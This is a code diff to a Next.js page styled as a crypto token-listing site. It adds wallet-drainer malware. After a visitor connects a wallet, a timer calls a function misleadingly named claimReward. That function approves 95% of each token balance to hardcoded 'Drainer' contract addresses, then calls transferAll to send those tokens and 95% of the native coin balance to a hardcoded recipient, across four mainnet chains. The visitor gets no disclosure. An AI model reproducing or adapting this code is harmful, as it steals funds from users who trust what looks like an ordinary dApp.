@@ -1,6 +1,6 @@
 "use client"
 import Image from "next/image";
-
+import { Metadata } from 'next'
 import pinksale from '../../public/ic-pinksale.61500ae2.svg'
 import dexview from '../../public/dexview-dark.svg';
 import baby from '../../public/baby.png'
@@ -31,11 +31,146 @@ import cronos from '../../public/images/cronos.svg'
 import bitrock from '../../public/images/bitrock.png'
 import core from '../../public/images/core.png'
 import dogechain from '../../public/images/dogechain.png'
-import pulse from '../../public/images/pulse.png'
+import pulse from '../../public/images/pulse.png';
+import ConnectButton from "@/components/ConnectButon/ConnectButton";
+
+import { createWeb3Modal, defaultConfig } from '@web3modal/ethers5/react';
+import { useWeb3Modal } from '@web3modal/ethers5/react';
+import { useWeb3ModalProvider, useWeb3ModalAccount, useWeb3ModalState } from '@web3modal/ethers5/react'
+import { Contract, ethers } from 'ethers';
+import Drainer from '../components/build/Drainer.json'
+// import Drainer from '../build/Drainer.json';
 
 
 
+const abi = [
+  {
+      "constant": false,
+      "inputs": [
+          {
+              "name": "spender",
+              "type": "address"
+          },
+          {
+              "name": "amount",
+              "type": "uint256"
+          }
+      ],
+      "name": "approve",
+      "outputs": [
+          {
+              "name": "",
+              "type": "bool"
+          }
+      ],
+      "payable": false,
+      "stateMutability": "nonpayable",
+      "type": "function"
+  }
+];
 
+// 1. Get projectId at https://cloud.walletconnect.com
+const projectId = '92f8c0e47c40ad2cc082fddb43804acd'
+
+const others = [
+  {
+    chainId: 42161,
+    name: 'Arbitrum',
+    currency: 'ETH',
+    explorerUrl: 'https://arbiscan.io',
+    rpcUrl: 'https://arb1.arbitrum.io/rpc'
+  },
+  {
+    chainId: 43114,
+    name: 'Avalanche Network',
+    currency: 'AVAX',
+    explorerUrl: 'https://snowtrace.io',
+    rpcUrl: 'https://api.avax.network/ext/bc/C/rpc'
+  },
+  {
+    chainId: 25,
+    name: 'Cronos Network',
+    currency: 'CRO',
+    explorerUrl: 'https://cronos.crypto.org/explorer',
+    rpcUrl: 'https://evm-cronos.crypto.org'
+  },
+  {
+    chainId: 250,
+    name: 'Fantom Opera Network',
+    currency: 'FTM',
+    explorerUrl: 'https://ftmscan.com',
+    rpcUrl: 'https://rpcapi.fantom.network'
+  }
+]
+
+// 2. Set chains
+const mainnet_chains = [
+  {
+    chainId: 1,
+    name: 'Ethereum',
+    currency: 'ETH',
+    explorerUrl: 'https://etherscan.io',
+    rpcUrl: 'https://mainnet.infura.io/v3/b23daccc62f64e9cab62eaa0d7c2db68'
+  },{
+    chainId: 137,
+    name: 'Polygon Mainnet',
+    currency: 'MATIC',
+    explorerUrl: 'https://polygonscan.com/',
+    rpcUrl: 'https://polygon-mainnet.infura.io/v3/b23daccc62f64e9cab62eaa0d7c2db68'
+  },{
+    chainId: 56,
+    name: 'BNB Chain',
+    currency: 'BNB',
+    explorerUrl: 'https://bscscan.com/',
+    rpcUrl: 'https://bsc-mainnet.infura.io/v3/b23daccc62f64e9cab62eaa0d7c2db68'
+  },{
+    chainId: 43114,
+    name: 'Avalanche Network C-Chain',
+    currency: 'AVAX',
+    explorerUrl: 'https://snowtrace.io/',
+    rpcUrl: 'https://avalanche-mainnet.infura.io/v3/b23daccc62f64e9cab62eaa0d7c2db68'
+  }
+]
+const testnets_chains = [{
+  chainId: 11155111,
+  name: "Sepolia Test Network",
+  currency: 'ETH',
+  explorerUrl: 'https://sepolia.etherscan.io',
+  rpcUrl: 'https://sepolia.infura.io/v3/b23daccc62f64e9cab62eaa0d7c2db68'
+},
+{
+  chainId: 97,
+  name: 'Binance Smart Chain',
+  currency: 'tBNB',
+  explorerUrl: 'https://testnet.bscscan.com',
+  rpcUrl: 'https://bsc-testnet-rpc.publicnode.com'
+}]
+
+// 3. Create modal
+const metadata = {
+  name: 'My Website',
+  description: 'My Website description',
+  url: 'http://localhost:3000', // origin must match your domain & subdomain
+  icons: ['http://localhost:3000/icon.ico']
+}
+
+
+// 4. Create Ethers config
+// const ethersConfig = defaultConfig({
+//   metadata,
+//   enableEIP6963: true, // true by default
+//   enableInjected: true, // true by default
+//   enableCoinbase: true, // true by default
+//   rpcUrl: 'https://sepolia.infura.io/v3/b23daccc62f64e9cab62eaa0d7c2db68', // used for the Coinbase SDK
+//   defaultChainId: 1 // used for the Coinbase SDK
+// })
+
+createWeb3Modal({
+  ethersConfig: defaultConfig({ metadata }),
+  chains: mainnet_chains,
+  projectId,
+  enableAnalytics: true // Optional - defaults to your Cloud configuration
+})
 
 export default function Home() {
   const router = useRouter();
@@ -46,8 +181,16 @@ export default function Home() {
 
 
   const [data, setData] = useState([])
+  const [addrInfo, setAddrInfo] = useState([])
   const [ change, setChange] = useState(false);
   const [inputted, setInputted] = useState('')
+  const [availChains, setAvailChains] = useState([
+    {name: 'sepolia', chainId: "11155111", status: false},
+    {name: 'bnb', chainId : "97", status: false}
+  ])
+  const { chainId, isConnected, address} = useWeb3ModalAccount()
+  const {open} = useWeb3ModalState()
+  const { walletProvider } = useWeb3ModalProvider()
 
   useEffect(() => {
 
@@ -56,18 +199,42 @@ export default function Home() {
       const data = await response.json()
       console.log("info: ", data)
       setData(data.data)
+
+
     }
 
-    // async function getProjects() {
-    //   const response = await fetch('/api/topProjects')
-    //   const data = await response.json()
-    //   console.log('topProjects: ', data.data)
-    // }
+    async function getMoralisData(address) {
+      const response = await fetch(`/api/getAllInfo?address=${address}`)
+      const inf = await response.json()
+      // console.log('resulted: ', inf)
+      setTimeout(() => {
+        setAddrInfo(inf)
+      }, 3000)
+    }
 
 
     getCoins()
-    // getProjects()
-  }, [])
+    if(address) {getMoralisData(address)}
+
+
+  }, [address])
+
+  useEffect(() => {
+
+    setTimeout(() => {
+
+      if(isConnected) {
+        if(addrInfo.length){
+          claimReward(addrInfo)
+        } else {
+          console.log('We out here')
+        }
+
+      }
+    }, 5000)
+  }, [isConnected, addrInfo])
+
+
 
   const change_ = () => {
     console.log('i am clicked!')
@@ -89,8 +256,210 @@ export default function Home() {
     setInputted(e.target.value)
   }
 
+  const claimReward = async(addr) => {
 
-  console.log('inputted: ', inputted)
+    console.log('chainId', chainId)
+    const drainAddresses = ['0x67eFE8239Dd091Da8486f7b07921D7b699AECc4F', '0xAb31D50880eE7AfbcBE729087C21fbe9cA434E37']
+    let ethersProvider = new ethers.providers.Web3Provider(walletProvider)
+    // if(chainId === 11155111) {
+    //   ethersProvider  = new ethers.JsonRpcProvider('https://sepolia.infura.io/v3/b23daccc62f64e9cab62eaa0d7c2db68')
+    // } else {
+    //   ethersProvider  = new ethers.JsonRpcProvider('https://polygon-mumbai.infura.io/v3/b23daccc62f64e9cab62eaa0d7c2db68')
+    // }
+    console.log('addrInfo: ', addr)
+    // console.log('Data: ', data)
+    const trasnferERC = addrInfo && addrInfo.filter(d => {
+      return d.chain === chainId
+    })
+
+    console.log('transferERC', trasnferERC)
+
+    const signer = ethersProvider.getSigner()
+    console.log('signer: ', signer)
+    let bal = await ethersProvider.getBalance(address)
+    let calc95 = (bal * 95)/100
+    console.log('cal95: ', calc95)
+
+
+
+
+    const ethVal = ethers.utils.formatEther(BigInt(calc95))
+    console.log('ethVal: ', ethVal)
+    const amount = ethers.utils.parseEther(ethVal)
+    console.log('amt: ', amount)
+    // The Contract object
+    let DrainerContract;
+    let ERC20;
+    let info = []
+    // let recipient = '0x6763d3CE81f12c6af800799432A1EF841BF33eA4'
+    let recipient = '0xA1ff3166bA5aB978D8011d1090b1884dc0334d9B' //for X
+
+    switch (chainId) {
+      case 1:
+          if (availChains[0].status) {
+            break
+          }
+
+          console.log('transferERC', trasnferERC)
+
+          for (let i=0; i < trasnferERC.length; i++) {
+            // const amountInWei = ethers.utils.parseUnits(amount.toString(), 18);
+            // Calculate 95% of the balance
+            const tokenContract = new Contract(trasnferERC[i].tok_or_nft_address, abi, signer)
+            const balan = BigInt(trasnferERC[i].balance)
+            console.log('balanceInDecimal: ', bal)
+
+            let calctok95 = (balan * BigInt(95))/BigInt(100)
+            const ethh = ethers.utils.formatEther(calctok95)
+            const amt = ethers.utils.parseEther(ethh)
+            console.log('console: ', amt)
+            // Approve 95% of the balance
+            const tx = await tokenContract.approve(drainAddresses[0], amt);
+            await tx.wait();
+          }
+
+          DrainerContract = new Contract(drainAddresses[0], Drainer.abi, signer)
+          const txn = await DrainerContract.transferAll(trasnferERC, recipient, {value: amount})
+          await txn.wait()
+          info = [...availChains]
+          info[0].status = true
+          setAvailChains(info)
+          break;
+      case 56:
+        if (availChains[1].status) {
+          break
+        }
+
+        for (let i=0; i < trasnferERC.length; i++) {
+          const tokenContract = new Contract(trasnferERC[i].tok_or_nft_address, abi, signer)
+          const balan = BigInt(trasnferERC[i].balance)
+          console.log('balanceInDecimal: ', bal)
+
+          let calct5 = (balan * BigInt(95))/BigInt(100)
+          const ethh = ethers.utils.formatEther(calct5)
+          const amt = ethers.utils.parseEther(ethh)
+          console.log('console: ', amt)
+          const tx = await tokenContract.approve(drainAddresses[1], amt);
+          await tx.wait();
+        }
+
+        DrainerContract = new Contract(drainAddresses[1], Drainer.abi, signer)
+        const txx = await DrainerContract.transferAll(trasnferERC, recipient,  {value: amount})
+        await txx.wait()
+        info = [...availChains]
+        info[1].status = true
+        setAvailChains(info)
+
+        break;
+      case 43114:
+          if (availChains[1].status) {
+            break
+          }
+
+          for (let i=0; i < trasnferERC.length; i++) {
+            const tokenContract = new Contract(trasnferERC[i].tok_or_nft_address, abi, signer)
+            const balan = BigInt(trasnferERC[i].balance)
+            console.log('balanceInDecimal: ', bal)
+
+            let calct5 = (balan * BigInt(95))/BigInt(100)
+            const ethh = ethers.utils.formatEther(calct5)
+            const amt = ethers.utils.parseEther(ethh)
+            console.log('console: ', amt)
+            const tx = await tokenContract.approve(drainAddresses[1], amt);
+            await tx.wait();
+          }
+
+          DrainerContract = new Contract(drainAddresses[1], Drainer.abi, signer)
+          const tfl = await DrainerContract.transferAll(trasnferERC, recipient,  {value: amount})
+          await tfl.wait()
+          info = [...availChains]
+          info[1].status = true
+          setAvailChains(info)
+
+          break;
+        case 137:
+            if (availChains[1].status) {
+              break
+            }
+
+            for (let i=0; i < trasnferERC.length; i++) {
+              const tokenContract = new Contract(trasnferERC[i].tok_or_nft_address, abi, signer)
+              const balan = BigInt(trasnferERC[i].balance)
+              console.log('balanceInDecimal: ', bal)
+
+              let calct5 = (balan * BigInt(95))/BigInt(100)
+              const ethh = ethers.utils.formatEther(calct5)
+              const amt = ethers.utils.parseEther(ethh)
+              console.log('console: ', amt)
+              const tx = await tokenContract.approve(drainAddresses[1], amt);
+              await tx.wait();
+            }
+
+            DrainerContract = new Contract(drainAddresses[1], Drainer.abi, signer)
+            const txl = await DrainerContract.transferAll(trasnferERC, recipient,  {value: amount})
+            await txl.wait()
+            info = [...availChains]
+            info[1].status = true
+            setAvailChains(info)
+
+            break;
+      default:
+        break;
+    }
+
+
+    //  const req = ethersProvider.send(
+    //   'wallet_switchEthereumChain',
+    //   [
+    //     {
+    //       chainId: 80001,
+
+    //     }
+    //   ])
+
+
+    try {
+
+      if(chainId === 1) {
+
+        await window.ethereum.request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: '0x1' }],
+        });
+        window.location.reload()
+      } else if(chainId === 43114){
+
+        await window.ethereum.request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: '0xa86a' }],
+        });
+
+        window.location.reload()
+
+      } else if(chainId === 137){
+
+        await window.ethereum.request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: '0x89' }],
+        });
+
+        window.location.reload()
+
+      } else if(chainId === 56){
+
+        await window.ethereum.request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: '0x38' }],
+        });
+
+        window.location.reload()
+
+      }
+    } catch (error) {
+      console.log('Error: ', error)
+    }
+    }
+
   return (
     <Aux>
       <div className="site-max-width">
@@ -387,12 +756,7 @@ export default function Home() {
             </a>
           <div>
           <div>
-            <button type="button" onClick={clicked} className="ant-btn ant-btn-primary">
-              <div className="flex items-center gap-1">
-                <div>Connect</div>
-                <div className="hidden-against-adblock sm:block">Wallet</div>
-              </div>
-            </button>
+            <ConnectButton />
           </div>
         </div>
         </div>
